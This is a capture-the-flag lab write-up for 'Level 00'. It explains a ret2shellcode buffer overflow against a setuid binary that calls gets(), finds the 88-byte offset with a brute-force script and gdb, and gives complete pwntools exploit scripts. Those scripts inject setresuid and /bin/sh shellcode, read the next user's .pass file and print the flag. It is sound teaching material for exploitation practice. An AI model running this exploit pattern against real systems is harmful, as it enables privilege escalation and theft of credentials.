# Level 00

## Exploit explanation : ret2shellcode

This level exploit is **ret2shellcode**. This exploit takes advantage of buffer overflow.

### How it works

When a function is called, the CPU pushes the return address onto the stack. This address is commonly referred to as the saved return address. When the function executes `ret`, this address is popped from the stack and loaded into RIP. Meaning that at the end of the function, it will jump to this exact address. If we can modify this value, we could be able to execute the slice of code that we want, or even inject code (that we will call `shellcode`). The easiest way to modify said `saved rip` would be to do a `buffer overflow`, meaning we would write in a buffer until it *overflows* into the `saved rip`.

In a more practical manner, we would inject the following :
- the correct number of padding bytes ('A', or any character really). This number is the `offset` between the start of the buffer and the address of the `saved rip`.
- the approximate address of our shellcode, written in place of the `saved rip`. This address will be where the ELF jumps to when done with the function. We don't have to be precise, as we will have the `NOP-sled` helping us before the shellcode.
- the NOP-sled. `NOP` is a special instruction labeled `\x90`, saying to just skip it. Thus, we can write a lot of `NOPs` just to have a safe landing place for our custom saved rip.
- the shellcode. Shellcode is the code that we want the ELF to execute. The most basic shellcode would execute for example `/bin/sh` to open a shell in which we can play around.

An example would be :
`A x <padding / offset> | <address inside the NOP-sled> | \x90 x <arbitrary number> | <shellcode>`

### How to find one

To find a `ret2shellcode`, we just need to find an unchecked `read` in a fixed-sized buffer for example. For this first exercise. we have access to the source code, and we can see the following :

```c
static void auth_loop(void) {
    char credentials[64];

    // ...

    gets(credentials);

    // ...
}
```

The easy way is also to check for a **SEGFAULT** :

```bash
$ perl -e 'print("A"x1000)' | ./case

  ╔══════════════════════════════════════╗
  ║   SPRAWL//NET Authentication v2.1   ║
  ║      Console cowboy detected.        ║
  ╚══════════════════════════════════════╝

[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: [SPRAWL//NET] Access denied.
[SPRAWL//NET] Audit: [1793611953] user=AAAAAAA...
Segmentation fault (core dumped)
```

The segfault is caused by the fact that we overwrite the `saved rip` with 'A's, jumping us to an illegal address.


## Exploit application

### Computing the offset

The first thing that we need is actually the offset, the padding needed to overwrite the saved rip. There is two ways to do it : a brute-forcy kinda way :

```bash
#/bin/bash
# 1-offset-brute-force.sh
set -e

count=1
while [[ $count -lt 100 ]]; do
    if ! printf 'a%.0s' $(seq 1 $count) | ./case >/dev/null; then
        echo "Crashed !"
        echo "Crashed with count = $count"
        exit 1
    fi
    ((count++))
done
```

This outputs :
```bash
./1-offset-brute-force.sh: line 11:  3139 Done                    printf 'a%.0s' $(seq 1 $count)
      3140 Segmentation fault      (core dumped) | ./case > /dev/null
Crashed !
Crashed with count = 88
```

Or we can compute the offset by finding both the saved rip address and the buffer address with gdb.

We disassemble the `auth_loop` function, and search for the buffer, which is of size 64, or 0x50 :

```gdb
(gdb) disas auth_loop
Dump of assembler code for function auth_loop:
# ...
   0x0000000000401593 <+135>:	mov    %rax,%rdi
   0x0000000000401596 <+138>:	call   0x401160 <gets@plt>
# ...
   0x000000000040162e <+290>:	nop
   0x000000000040162f <+291>:	leave
   0x0000000000401630 <+292>:	ret
End of assembler dump.
```

We put break points, and look at the registers :

```gdb
(gdb) b *0x0000000000401596
Breakpoint 1 at 0x401596
(gdb) b *0x0000000000401630
Breakpoint 2 at 0x401630
(gdb) info registers
# The address of our buffer is here
rax            0x7fffffffe1c0      140737488347584
# ...
(gdb) info frame
Stack level 0, frame at 0x7fffffffe220:
 rip = 0x401596 in auth_loop; saved rip = 0x401648
 called by frame at 0x7fffffffe230
 Arglist at 0x7fffffffe210, args: 
 Locals at 0x7fffffffe210, Previous frame's sp is 0x7fffffffe220
 Saved registers:
  rbp at 0x7fffffffe210, rip at 0x7fffffffe218
```

So we have the buffer at the address `0x7fffffffe1c0` and the saved rip at `0x7fffffffe210`. We have `0x7fffffffe218 - 0x7fffffffe1c0 = 0x58 = 88`.

Nice ! Now we just have to build the payload. We can do it easily with a small Python script, using the `pwn` library to build the shellcode &al.

```python
#!/usr/bin/env python3
# 2-exploit.py

import os
import sys
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

OFFSET = 88
NOP_SLED = 512
RET_ADDR = 0x7fffffffe300

binary = "./case"
if len(sys.argv) > 1:
    binary = sys.argv[1]

sc = pwn.asm(
    pwn.shellcraft.setresuid(os.stat(binary).st_uid)
    + pwn.shellcraft.sh()
)

body = b'A' * OFFSET + pwn.p64(RET_ADDR) + b'\x90' * NOP_SLED + sc

with open("payload", "wb") as f:
    f.write(body)
```

`body` contains the payload. It consists of 88 'A's, the return address modified to point somewhere in the middle of the NOP-sled, a pretty huge NOP-sled and the shellcode. We use `shellcraft` to build the shellcode. We want it to keep its SUID and open a shell. We write the payload to a file named `payload`.

We can now get the pass in two ways :

**The interactive method** : we pipe the payload in the ELF :
```bash
$ cat ./payload - | ./case

  ╔══════════════════════════════════════╗
  ║   SPRAWL//NET Authentication v2.1   ║
  ║      Console cowboy detected.        ║
  ╚══════════════════════════════════════╝

[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: 
[SPRAWL//NET] Access denied.
[SPRAWL//NET] Audit: [1793619074] user=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA status=FAIL

ls -la /home/flag00
total 28
drwx------  2 flag00 flag00 4096 Jun  9 23:13 .
drwxr-xr-x 37 root   root   4096 Jun  9 23:13 ..
-rw-r--r--  1 flag00 flag00  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 flag00 flag00 3771 Mar 31  2024 .bashrc
-rw-r--r--  1 flag00 flag00   30 Jun  9 23:12 .gdbinit
-r--------  1 flag00 flag00   33 Jun  9 23:13 .pass
-rw-r--r--  1 flag00 flag00  807 Mar 31  2024 .profile
cat /home/flag00/.pass
czugaihitjx0lys47blkh0qwtzz1c9g6
```

Or we can automate it with a Python script :

```python
#!/usr/bin/env python3

import os
import sys
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

OFFSET = 88
NOP_SLED = 512
RET_ADDR = 0x7fffffffe300

binary = "./case"
if len(sys.argv) > 1:
    binary = sys.argv[1]

sc = pwn.asm(
    pwn.shellcraft.setresuid(os.stat(binary).st_uid)
    + pwn.shellcraft.sh()
)

body = b'A' * OFFSET + pwn.p64(RET_ADDR) + b'\x90' * NOP_SLED + sc

with open("payload", "wb") as f:
    f.write(body)

p = pwn.process([binary])
p.sendline(body)
p.sendline(b'cat /home/flag00/.pass')
p.sendline(b'exit')
out = p.recvall(timeout=2)
p.close()

for raw in out.splitlines():
    s = raw.strip()
    if len(s) == 32 and s.isalnum():
        print(s.decode(errors='replace'))
```

and we launch it :

```bash
$ python3 e.py
czugaihitjx0lys47blkh0qwtzz1c9g6
```